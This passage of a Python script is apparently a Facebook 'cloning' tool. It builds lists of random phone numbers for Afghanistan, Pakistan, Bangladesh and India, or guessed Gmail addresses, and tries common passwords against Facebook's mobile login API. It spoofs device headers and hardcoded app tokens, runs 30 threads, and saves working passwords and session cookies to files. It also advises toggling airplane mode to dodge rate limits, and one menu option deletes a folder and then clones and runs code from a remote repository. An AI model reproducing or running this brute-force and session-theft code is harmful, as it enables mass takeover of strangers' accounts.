	print('\033[1;37m======================================================')
#------------------[salar clear menu]-------------------#
def clear():
	os.system('clear')
	print(logo)
#------------------[salar color menu]-------------------#
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#------------------[salar apk menu]-------------------#
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
#------------------[salar loop menu]-------------------#
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]       
#------------------[salar main menu]-------------------#
def menu():
			clear()
		#	linex()
			print('[1] File cloning\n[2] Random cloning\n[3] gmail cloning\n[4] old cloning\n[0] Exit menu')
			linex()
			xd=input('Choose an option: ')
			os.system('xdg-open https://www.facebook.com/Salarkhanoo1')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print('\033[1;37m[•] All method working ')
				linex()
				print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
				linex()
				mthd=input('Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input('How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f'Put password {i+1}: '))
				clear()
				print('Do you went show cp account? (y/n): ')
				linex()
				cx=input('Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print('\033[1;37m[•] TOTAL ACCOUNT IDS : \033[1;32m'+total_ids+f' ')
					print('\033[1;37m[•] PROCESS START NOW PLEASE WAIT...')
					print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python salar.py')
			elif xd in ['2','02']:
				clear()
				print('[1] Afghanistan cloning\n[2] Pakistan cloning\n[3] Bangladesh cloning\n[4] India cloning\n[0] Back menu')
				linex()
				x=input(' Choose: ')
				if x in ['1','01']:
					afg()
				elif x in ['2','02']:
					pak()
				elif x in ['3','03']:
					bd()
				elif x in ['4','04']:
					ind()
			elif xd in ['3','03']:
				gmail()
				exit()
			elif xd in ['4','04']:
				os.system('rm -rf old && git clone --depth=1 https://github.com/SaLarKhAnOo2003/old.git && cd old && python old.py')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
#----------[salar afghanistan cloning menu]----------#
def afg():
		user=[]
		clear()
		print('\033[1;35m Code example: 9377,9379,9374,9370')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
		linex()
		mthd = input('Choose: ')
		clear()
		print('\033[1;37m[1] Clone with auto pass (\033[1;33monly-afg\033[1;37m) ')
		linex()
		pcs = input('[•] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as salar:	
			clear()
			tl = str(len(user))
			print('\033[1;37m[•] TOTAL IDS : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m[•] CHOICE CODE  :\033[1;32m '+code)
			print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','afghan12345','afghan123','۱۲۳۴۵۶۷۸۹','afghanistan','Afghanistan','500500','100200','10002000','900900','Kabul123','afghan1234','Kabul12345','Afghan100200','Khan123','Afghan12345','Afghan123']
				if mthd in ['1','01']:
					salar.submit(rand1,ids,passlist)
				if mthd in ['2','02']:
					salar.submit(rand2,ids,passlist)
				if mthd in ['3','03']:
					salar.submit(rand3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python salar.py')
#----------[salar pakistan cloning menu]----------#
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 92301,92303,92306,92302')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
		linex()
		mthd = input('Choose: ')
		clear()
		print('\033[1;37m[1] Clone with auto pass (\033[1;33monly-pak\033[1;37m) ')
		linex()
		pcs = input('[•] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as salar:	
			clear()
			tl = str(len(user))
			print('\033[1;37m[•] TOTAL IDS : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m[•] CHOICE CODE  :\033[1;32m '+code)
			print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'Pakistan','Khan12345','Khan123','KhanKhan','Khan12@#','123456','500500','100200','10002000','Pashtoon','Pashtoon123','Pashtoon1234','Pashtoon12345','khankhan','khan123','Khanbaba','KhanBaba']
				if mthd in ['1','01']:
					salar.submit(rand1,ids,passlist)
				if mthd in ['2','02']:
					salar.submit(rand2,ids,passlist)
				if mthd in ['3','03']:
					salar.submit(rand3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python salar.py')
#----------[salar bangladesh cloning menu]----------#
def bd():
		user=[]
		clear()
		print('\033[1;35m Code example: 88016,88017,88018,88019')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
		linex()
		mthd = input('Choose: ')
		clear()
		print('\033[1;37m[1] Clone with auto pass (\033[1;33monly-bd\033[1;37m) ')
		linex()
		pcs = input('[•] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as salar:	
			clear()
			tl = str(len(user))
			print('\033[1;37m[•] TOTAL IDS : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m[•] CHOICE CODE  :\033[1;32m '+code)
			print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'100200','10002000','bangladesh','bangladesh123','bangladesh1234','bangladesh12345','free fire','Baba123','I love you','KhanBaba']
				if mthd in ['1','01']:
					salar.submit(rand1,ids,passlist)
				if mthd in ['2','02']:
					salar.submit(rand2,ids,passlist)
				if mthd in ['3','03']:
					salar.submit(rand3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python salar.py')
#----------[salar india cloning menu]----------#
def ind():
		user=[]
		clear()
		print('\033[1;35m Code example: 91778,91930,91902,91712')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
		linex()
		mthd = input('Choose: ')
		clear()
		print('\033[1;37m[1] Clone with auto pass (\033[1;33monly-ind\033[1;37m) ')
		linex()
		pcs = input('[•] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as salar:	
			clear()
			tl = str(len(user))
			print('\033[1;37m[•] TOTAL IDS : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m[•] CHOICE CODE  :\033[1;32m '+code)
			print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'57273200','hindustan','salman khan','india123','59039200','57575751']
				if mthd in ['1','01']:
					salar.submit(rand1,ids,passlist)
				if mthd in ['2','02']:
					salar.submit(rand2,ids,passlist)
				if mthd in ['3','03']:
					salar.submit(rand3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python salar.py')
#----------[salar gmail cloning menu]----------#
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com ')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		clear()
		print('[1] Method (\033[1;32mnew\033[1;37m) \033[1;37m[2] Method (\033[1;32mold\033[1;37m)\033[1;37m [3] Method (\033[1;32mmix\033[1;37m)')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as salar:
			total = str(len(fo))
			clear()
			print('\033[1;37m[•] TOTAL IDS : \033[1;32m'+total+f' ')
			print('\033[1;37m[•] AIRPLANE ✈️ MODE [\033[1;91mON\033[1;37m/\033[1;32mOFF\033[1;37m] EVERY 2 MINUTES')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					salar.submit(rand1,ids,passlist)
				if mthd in ['2','02']:
					salar.submit(rand2,ids,passlist)
				if mthd in ['3','03']:
					salar.submit(rand3,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python salar.py')
#----------[salar file clonig 1 method]----------#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M1\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','Awcc','Mtn','Salaam','Etisalat','Roshan'])
                        #ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua1(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[SALAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SALAR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SALAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[SALAR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[91;1m[SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#----------[salar file cloning 2 method]----------#		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M2\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','Awcc','Mtn','Salaam','Etisalat','Roshan'])
                        #ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua2(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[SALAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SALAR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SALAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SALAR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[91;1m[SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#----------[salar file cloning 3 method]----------#
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M3\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                       # ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;] FBBK/1"
                        data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
                        headers ={'User-Agent': ua3(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[SALAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powertrt = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);trtramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={trtramxan};{powertrt}"
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SALAR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                                        open('/sdcard/SALAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SALAR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[91;1m[SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SALAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#----------[salar random cloning 1 method]----------#
def rand1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M1\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
